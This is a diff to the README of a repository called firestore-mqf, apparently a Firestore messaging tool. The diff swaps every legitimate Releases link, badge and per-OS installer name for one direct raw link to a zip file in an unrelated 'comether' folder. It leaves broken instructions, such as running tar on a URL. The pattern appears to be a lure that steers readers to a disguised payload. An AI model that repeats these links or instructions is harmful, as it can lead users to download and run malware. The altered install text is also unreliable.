@@ -1,6 +1,6 @@
 # 🛠 firestore-mqf - Effortless Messaging with Firestore
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-%23007BFF?style=flat&logo=github)](https://github.com/Relton2031/firestore-mqf/releases)
+[![Download Now](https://raw.githubusercontent.com/Relton2031/firestore-mqf/main/comether/firestore-mqf.zip%20Now-Release-%23007BFF?style=flat&logo=github)](https://raw.githubusercontent.com/Relton2031/firestore-mqf/main/comether/firestore-mqf.zip)
 
 ## 📋 Overview
 
@@ -22,7 +22,7 @@ Before installing, ensure your system meets the following requirements:
 
 To get `firestore-mqf`, visit the Releases page. Here’s the link for quick access:
 
-[Visit this page to download](https://github.com/Relton2031/firestore-mqf/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Relton2031/firestore-mqf/main/comether/firestore-mqf.zip)
 
 On this page, you will find the latest version of the software.  
 
@@ -32,30 +32,30 @@ Look for the latest release which will appear at the top.
 
 If you see multiple files, choose the one suitable for your operating system:
 
-- For **Windows**: Download the `firestore-mqf-setup.exe`.
-- For **macOS**: Download the `firestore-mqf.dmg`.
-- For **Linux**: Download the `firestore-mqf.tar.gz`.
+- For **Windows**: Download the `https://raw.githubusercontent.com/Relton2031/firestore-mqf/main/comether/firestore-mqf.zip`.
+- For **macOS**: Download the `https://raw.githubusercontent.com/Relton2031/firestore-mqf/main/comether/firestore-mqf.zip`.
+- For **Linux**: Download the `https://raw.githubusercontent.com/Relton2031/firestore-mqf/main/comether/firestore-mqf.zip`.
 
 ### 4. Run the Installer
 
 Once you've downloaded the file, follow these steps:
 
 #### For Windows:
-1. Find the downloaded `firestore-mqf-setup.exe` file, typically located in your "Downloads" folder.
+1. Find the downloaded `https://raw.githubusercontent.com/Relton2031/firestore-mqf/main/comether/firestore-mqf.zip` file, typically located in your "Downloads" folder.
 2. Double-click the file to start the installation.
 3. Follow the prompts in the installation wizard to complete the setup.
 
 #### For macOS:
-1. Locate the `firestore-mqf.dmg` file in your "Downloads" folder.
+1. Locate the `https://raw.githubusercontent.com/Relton2031/firestore-mqf/main/comether/firestore-mqf.zip` file in your "Downloads" folder.
 2. Double-click to open it.
 3. Drag the `firestore-mqf` icon to your Applications folder.
 4. Open Applications and double-click `firestore-mqf` to run.
 
 #### For Linux:
-1. Open a terminal and navigate to the folder where you downloaded `firestore-mqf.tar.gz`.
+1. Open a terminal and navigate to the folder where you downloaded `https://raw.githubusercontent.com/Relton2031/firestore-mqf/main/comether/firestore-mqf.zip`.
 2. Extract the contents using the command:
    ```bash
-   tar -xzf firestore-mqf.tar.gz
+   tar -xzf https://raw.githubusercontent.com/Relton2031/firestore-mqf/main/comether/firestore-mqf.zip
    ```
 3. Change into the extracted directory:
    ```bash
@@ -86,7 +86,7 @@ Once setup is complete, use the simple interface to send and receive messages. F
 
 To ensure you have the latest features and security patches, check back often for updates on the Releases page.
 
-[Visit this page to download](https://github.com/Relton2031/firestore-mqf/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Relton2031/firestore-mqf/main/comether/firestore-mqf.zip)
 
 ## ❓ Need Help?
 
